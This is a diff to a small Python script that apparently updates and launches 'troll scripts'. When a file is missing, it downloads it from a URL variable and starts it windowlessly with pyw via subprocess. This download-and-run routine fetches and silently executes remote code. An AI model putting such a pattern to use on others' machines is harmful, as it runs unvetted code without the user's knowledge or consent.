@@ -1,5 +1,5 @@
 # Runs the troll scripts and updates its-self
-import os, urllib.request, pathlib, time
+import os, urllib.request, pathlib, time, subprocess
 def main():
     def sleep(Time):
         time.sleep(Time)
@@ -15,9 +15,8 @@ def main():
             except FileNotFoundError:
                 print('Its Not Here')
                 urllib.request.urlretrieve(dlurl, '{}'.format(path))
-                sleep(1)
-                os.system("start cmd /c {}".format('pyw ' + path))
+                #os.system("start cmd /c {}".format('pyw ' + path))
+                subprocess.Popen(['pyw', 'update.pyw'])
                 exit()
         updater()
-        sleep(10)
 main()
